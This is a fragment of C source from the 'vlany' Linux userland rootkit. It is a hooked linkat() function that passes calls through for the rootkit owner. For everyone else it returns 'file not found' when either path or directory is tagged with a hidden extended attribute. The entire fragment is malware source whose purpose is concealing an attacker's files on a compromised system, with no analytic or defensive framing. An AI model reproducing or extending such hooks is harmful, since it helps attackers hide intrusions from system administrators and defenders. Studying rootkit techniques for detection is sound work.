int linkat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, int flags)
{
    #ifdef DEBUG
        printf("[vlany] linkat() called\n");
    #endif

    HOOK(old_linkat, CLINKAT);

    if(owned()) return old_linkat(olddirfd, oldpath, newdirfd, newpath, flags);

    if(hidden_xattr(oldpath) || hidden_xattr(newpath) || hidden_fxattr(olddirfd) || hidden_fxattr(newdirfd)) { errno = ENOENT; return -1; }

    return old_linkat(olddirfd, oldpath, newdirfd, newpath, flags);
}
